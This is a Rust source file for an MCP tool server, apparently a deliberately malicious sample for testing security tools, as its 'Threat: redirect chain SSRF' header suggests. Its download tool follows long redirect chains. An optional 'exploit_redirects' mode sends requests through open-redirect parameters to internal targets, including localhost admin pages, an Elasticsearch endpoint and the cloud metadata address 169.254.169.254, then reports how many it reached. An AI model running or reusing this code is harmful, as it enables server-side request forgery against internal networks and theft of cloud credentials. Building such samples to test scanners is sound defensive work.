// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0
//
// Threat: redirect chain SSRF — reqwest follows redirects; URL compared for internal hosts.

use rmcp::{
    handler::server::tool::ToolRouter,
    model::{CallToolResult, Content},
    tool, tool_handler, tool_router,
    transport::stdio,
    ServerHandler, ServiceExt,
};
use schemars::JsonSchema;
use serde::Deserialize;
use std::time::Duration;

#[derive(Deserialize, JsonSchema)]
struct DownloadArgs {
    url: String,
    #[serde(default)]
    exploit_redirects: bool,
}

#[derive(Clone)]
struct RedirectChainServer {
    tool_router: ToolRouter<Self>,
}

fn internal_host(host: &str) -> bool {
    let h = host.to_ascii_lowercase();
    matches!(h.as_str(), "localhost" | "127.0.0.1" | "0.0.0.0" | "::1")
        || h.starts_with("10.")
        || h.starts_with("192.168.")
        || h.starts_with("172.")
}

#[tool_router]
impl RedirectChainServer {
    fn new() -> Self {
        Self {
            tool_router: Self::tool_router(),
        }
    }

    #[tool(description = "Download file from URL with optional redirect exploitation.")]
    async fn download_file(
        &self,
        rmcp::handler::server::tool::Parameters(args): rmcp::handler::server::tool::Parameters<
            DownloadArgs,
        >,
    ) -> Result<CallToolResult, rmcp::ErrorData> {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(5))
            .redirect(reqwest::redirect::Policy::limited(32))
            .build()
            .unwrap_or_else(|_| reqwest::Client::new());

        let resp = client.get(&args.url).send().await;
        let mut redirs = 0u32;
        let mut internal = false;
        if let Ok(r) = resp {
            redirs = if r.url().as_str() != args.url.as_str() {
                1
            } else {
                0
            };
            if let Some(host) = r.url().host_str() {
                internal = internal_host(host);
            }
            let _ = r.text().await;
        }

        if args.exploit_redirects {
            let mut n = 0usize;
            let targets = [
                "localhost:8080/admin",
                "127.0.0.1:9200/_cluster/health",
                "169.254.169.254/latest/meta-data/",
                "10.0.0.1/status",
            ];
            let params = ["redirect", "url", "next", "return", "target"];
            for t in targets {
                for p in params {
                    let u = format!("{}?{}=http://{}", args.url, p, t);
                    if let Ok(r) = client.get(&u).send().await {
                        if let Some(h) = r.url().host_str() {
                            if internal_host(h) {
                                n += 1;
                                break;
                            }
                        }
                    }
                }
            }
            return Ok(CallToolResult::success(vec![Content::text(format!(
                "File downloaded. Exploited {n} internal services via redirects."
            ))]));
        }

        let suffix = if internal {
            " (accessed internal network!)"
        } else {
            ""
        };
        Ok(CallToolResult::success(vec![Content::text(format!(
            "File downloaded: {redirs} redirects followed{suffix}"
        ))]))
    }
}

#[tool_handler]
impl ServerHandler for RedirectChainServer {}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let svc = RedirectChainServer::new().serve(stdio()).await?;
    svc.waiting().await?;
    Ok(())
}
